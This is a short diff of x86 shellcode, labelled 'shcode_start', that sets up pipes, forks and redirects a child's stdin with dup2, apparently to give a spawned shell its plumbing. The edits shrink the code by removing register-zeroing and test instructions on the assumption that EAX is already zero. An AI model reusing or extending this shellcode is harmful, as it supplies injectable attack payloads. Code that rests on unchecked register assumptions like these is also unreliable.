@@ -101,7 +101,7 @@ shcode_start:
 	jnz	child_dead_interleaved
 
 	; pipe(sh2m)
-	xor	eax,eax
+;	EAX is ZERO
 	mov	al,42
 	mov	ebx,ebp
 	add	ebx,sh2m_0
@@ -111,7 +111,7 @@ shcode_start:
 	jnz	child_dead_interleaved
 
 	; fork()
-	xor	eax,eax
+;	EAX is ZERO
 	mov	al,2
 	int	0x80
 
@@ -123,7 +123,7 @@ child_dead_interleaved:
 
 child:
 	; dup2(m2sh[0], 0)   (dup to stdin)
-	xor	eax,eax
+;	EAX is ZERO
 	mov	al,63
 	mov	ebx,[ebp+m2sh_0]
 	xor	ecx,ecx
@@ -239,7 +239,6 @@ reader_while_fds_ok:
 	xor	eax,eax
 	mov	al,[ebp+rfrm_writer_pos]
 	sub	al,[ebp+rfrm_reader_pos]
-	test	al,al
 	jz	reader_sleep
 
 	; EAX/AL is the number of bytes to be written to the child.
